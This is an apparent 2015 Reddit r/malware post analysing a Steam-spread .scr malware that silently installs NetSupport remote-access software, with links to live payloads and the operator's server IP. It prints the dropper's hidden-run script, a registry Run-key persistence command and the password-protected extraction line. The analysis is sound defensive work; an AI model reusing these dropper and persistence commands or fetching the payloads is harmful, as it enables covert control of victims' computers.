{
    "op": {
        "upvote_ratio": null,
        "selftext": "**WARNING: Information contained in this post may result in you infecting yourself with a live piece of MOSTLY UNDETECTED malware!**  \n  \n**Proceed with caution!!!**  \n  \nIf anyone's used Steam a lot, they've inevitably come across a variation of one of those \"Click this image link!\" things that redirects you to a fake image hosting site, and downloads a .scr file.  \n  \nWell, I got curious one day, so decided to investigate.  \n  \n1.) Scan with virustotal.com  \n  \n[Virustotal Link](https://www.virustotal.com/en/file/808027e47111b52dac9e164713a4a408bb9f5ffcd814b09c57ed9b74bbab3359/analysis/1439847689/)  \n  \nCurrently undetected by everyone excluding 1 Chinese company. That's a little worrying. Must be something new (Although it's been around for years), or simply polymorphic (More probably)  \n  \n2.) Submit to malwr.com  \n  \n[Analysis Link](https://malwr.com/analysis/MTcwNjEwNTMyYjk2NGRiMzgxZThjMzNhMjZkN2QyODE/)  \n  \nTwo main things to note here.  \n  \n- Connection to www.myflare.com under \"Network Analysis\"  \n- 3 dropped files  \n  \n3.) Investigation!  \n  \nDropped file 1  \n  \ninst.js  \n  \n&gt; var WSHShell = WScript.CreateObject(\"WScript.Shell\");  \nWSHShell.Run('set.cmd',0);  \nWSHShell.Run('run.cmd',0);\n  \nIt runs 2 other files. But where do those come from?  \n  \nDropped file 2\n  \ndown.js  \n  \n[Pastebin Link](http://pastebin.com/7vAb4rqE) -  **WARNING - Those MyFlare files are live - Take caution!**  \n  \nOk - That's a little more significant. It downloads 4 files. set.cmd and run.cmd are then run by the first dropped file - inst.js  \n  \nLet's examine those  \n  \nruns.exe - Toss it through ProtectionID and we get this - [Picture](http://i.imgur.com/1zd4rIF.png) - It's the 7zip extractor. That small mystery solved.  \n  \nNext downloaded file - Simply called \"file\".  \n  \nRename it to a .txt, open with Notepad, and the first 3 characters show \"7z\u00bc\" - Possibly a 7zip archive. Rename the file to .rar, open with WinRAR, and we get...  \n  \n[Picture](http://i.imgur.com/76p33Cs.png)  \n  \nThe NVidia Display settings in a compressed passworded file? That's weird. Anyways - Carrying on. The next downloaded file!  \n  \nrun.cmd - Open with notepad, and we get  \n  \n&gt; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /f /v \"nvxdsync32.exe\" /t REG_SZ /d \"%APPDATA%\\Security\\nvxdsync32.exe\"\n  \nHmmm - So it seems that NVidia driver is more than it appears... But the archive is passworded. Hopefully the final file will shed some light on matters!  \n  \nset.cmd  \n  \n[Pastebin Link](http://pastebin.com/1hQMyz7K)  \n  \nOk - Wow. This does a lot of stuff. A line that sticks out is  \n  \n&gt; \"%APPDATA%\\runs.exe\" x -pferum -y \"%APPDATA%\\file\" -o\"%APPDATA%\"\n  \nRemember \"runs\" was the renamed 7zip extractor? Well - What do we have here... \"-pferum\" ? Password of \"ferum\" ? Test, and....  \n  \n[Picture](http://i.imgur.com/qEFcRWz.png) - It Extracted - In a hidden folder!  \n  \nOpen it, and... [Picture](http://i.imgur.com/7ORcF8a.png)  \n  \n...  \n  \nSo where are the rest files?  \n  \nWell, it seems that set.cmd also plays around with folder permissions a bit... So let's try find them!  \n  \n[Picture](http://i.imgur.com/EbS8q0n.png) - Yup - There they are!  \n \nAfter a bit of fiddling around - GOT THEM! - \n[Picture](http://i.imgur.com/WzAWfYg.png)  \n  \nSo - What's so special about that NVidia config file now... ? Right-Click Properties, and.... That doesn't look right! - [Picture](http://i.imgur.com/C2i3r0s.png)  \n  \nDo a bit of research on Net Support, and we figure out that it's a piece of Remote Desktop software. Who would've thought!  \n  \n4.) The End  \n  \nNow, this is unfortunately where my little adventure ends. For you see, whilst I was able to acquire a trial version of the Net Support software (It's a legitimate piece of software), I was unable to connect to his server, as I was unable to decipher the Gateway key he used.  \n  \n[Config file - Picture](http://i.imgur.com/Jg0YblC.png)   (Well well Mr Dew of Germany...)  \n  \n[Vague decryption attempts - Picture](http://i.imgur.com/hrLiZII.png)  - I could input characters and get an encrypted output. I had the output I needed, although I couldn't figure out the input. This is a sample of the input / output.    \n  \nUnfortunately my Cryptography skills are insufficient, so here the story ends. I am simply one powerless individual, so am unable to do anything about tracking down the server IP - 46.165.206.78 - Currently online as of posting.  \n  \nI hope you had a good read, maybe learned something, and enjoy the rest of your day!  \n  \n**UPDATE**  \n  \nrachaelmac from MyFlare support contacted me, and claimed the files in down.js were removed. They were not.",
        "title": "Analysis of the .scr virus going around Steam",
        "score": 117,
        "id": "3hgr03",
        "commsNum": 54,
        "timeStamp": "2015/08/18-09:41:40",
        "author_name": "Reelix",
        "is_self": true,
        "locked": null,
        "num_comments": 54,
        "over_18": false,
        "spoiler": null,
        "subreddit": "malware",
        "stickied": false,
        "url": "http://www.reddit.com/r/Malware/comments/3hgr03/analysis_of_the_scr_virus_going_around_steam/"
    },
    "posts": {}
}